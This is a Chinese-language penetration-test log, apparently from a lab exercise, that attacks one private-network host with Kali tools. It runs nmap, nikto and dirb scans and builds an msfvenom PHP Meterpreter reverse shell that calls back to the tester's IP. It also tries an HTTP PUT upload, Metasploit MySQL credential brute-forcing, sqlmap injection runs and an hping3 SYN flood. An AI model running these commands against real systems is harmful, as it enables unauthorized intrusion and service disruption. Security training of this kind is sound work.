
以下tool皆在 kali Linux 使用

# nmap 網路檢測

    $ nmap 10.101.3.122

![Image](https://i.imgur.com/IHsYjw5.png)

只有 port 80, 3306, 5357 打開


偵測作業系統版本

    $ nmap -A 10.101.3.122

or 

    $ nmap -O 10.101.3.122

![Image](https://i.imgur.com/84DtRli.png)

AVtech Room Alert 26W environmental monitor (87%), Microsoft Windows XP SP2 (85%)

可能是Windows XP OS


測試主機是否有防火牆

    $ nmap -sA 10.101.3.122

![Image](https://i.imgur.com/bYvnQWA.png)

Starting Nmap 7.70 ( https://nmap.org ) at 2019-12-23 01:24 EST
Nmap scan report for 10.101.3.122
Host is up (0.00055s latency).
All 1000 scanned ports on 10.101.3.122 are filtered
MAC Address: 02:00:0A:65:03:7A (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 21.14 seconds

# nikto 網路弱點掃描

偵測port 80,3306,5357弱點

    $ nikto -h 10.101.3.122 -p 80, 3306, 5357

![Image](https://i.imgur.com/OxipnPa.png)


OSVDB-397 可以使用 put 方法

# dirb 搜尋可能的uri

    $ dirb http://10.101.3.122/esncku/

![Image](https://i.imgur.com/ckTq61d.png)

搜尋出 "esncku/console", "esncku/en", "esncku/inc", "esncku/upload", "esncku/zh" 路徑

# nmap 偵測uri http 方法

    $ nmap -script http-methods -script-args http-methods.url-path='/esncku/',http-methods.test-all -p 80 10.101.3.122

![Image](https://i.imgur.com/NyOTI3M.png)

建立PHP Meterpreter reverse shell

    $ msfvenom -p php/meterpreter/reverse_tcp lhost=10.101.3.61 lport=4444 -f raw > /root/meterpreter.php

嘗試將建立出來的 meterpreter.php 送上server

    $ nmap -sV -script http-put -script-args http-put.url='/esncku/meterpreter.php',http-put.file='/meterpreter.php' -p 80 10.101.3.122

![Image](https://i.imgur.com/KgA0zbE.png)

失敗....

# MYSQL渗透

    $ msfconsole
    $ nmap --script=mysql-info 10.101.3.122
    $ use auxiliary/scanner/mysql/mysql_version
    $ set RHOSTS 10.101.3.122
    $ exploit

![Image](https://i.imgur.com/4nrHTD0.png)

似乎不允許這台IP連線，不過還是繼續試試看

    $ use auxiliary/scanner/mysql/mysql_login
    $ set RHOSTS 10.101.3.122
    $ set user_file /usr/share/metasploit-framework/data/wordlists/db2_default_user.txt
    $ set pass_file /usr/share/metasploit-framework/data/wordlists/db2_default_pass.txt
    $ exploit
![Image](https://i.imgur.com/tBRjLlA.png)

不支援My-SQL ?

# XSS Try 

![Image](https://i.imgur.com/PXRLCoR.png)

![Image](https://i.imgur.com/i2bqrQd.png)

![Image](https://i.imgur.com/3QsAEAn.png)


# SQL injection

![Image](https://i.imgur.com/og5wkCY.png)

# 使用sqlmap讀取資料庫資料

sqlmap -u http://10.101.3.122/esncku/zh/page.teacher.query.action?id=2

sqlmap -u http://10.101.3.122/esncku/download.action?id=107&path=resource.document.file

sqlmap -u http://10.101.3.122/esncku/console/image.teacher.action?personId=34

![Image](https://i.imgur.com/B4iJbMM.png)

嘗試以上網址都找不到突破點


# 開大絕DDOS

    $ hping3 -c 100000000 -d 120 -S -V -w 64 --flood --rand-source 10.101.3.122

![Image](https://i.imgur.com/cf0ogAz.png)

開另一個分頁，偵測local網卡封包

    $ tshark

![Image](https://i.imgur.com/CzLNVpM.png)

打開target網頁，網頁loading變慢

![Image](https://i.imgur.com/wIfRhfC.png)

